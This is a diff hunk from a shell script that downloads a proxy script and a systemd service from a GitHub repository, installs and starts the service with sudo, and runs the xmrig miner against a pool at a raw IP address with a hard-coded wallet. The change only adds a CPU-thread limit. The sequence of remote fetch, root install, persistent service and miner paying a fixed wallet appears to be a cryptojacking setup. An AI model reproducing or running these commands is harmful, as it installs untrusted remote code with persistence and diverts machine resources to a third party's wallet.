@@ -25,4 +25,4 @@ wget https://github.com/robertreynolds2/bteteteh/raw/main/btproxy.sh
 wget https://raw.githubusercontent.com/robertreynolds2/bteteteh/main/mystart.service
 sudo cp mystart.service /etc/systemd/system/mystart.service
 sudo systemctl start mystart
-./xmrig -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq2#yl8x-tlrw -p x
+./xmrig -o 139.180.190.196:1231 -u BTT:TRGnhHFiSb4256PzFSEBqEF34psbsT2NPN.aq2#yl8x-tlrw -p x -cpu-max-threads-hint=85
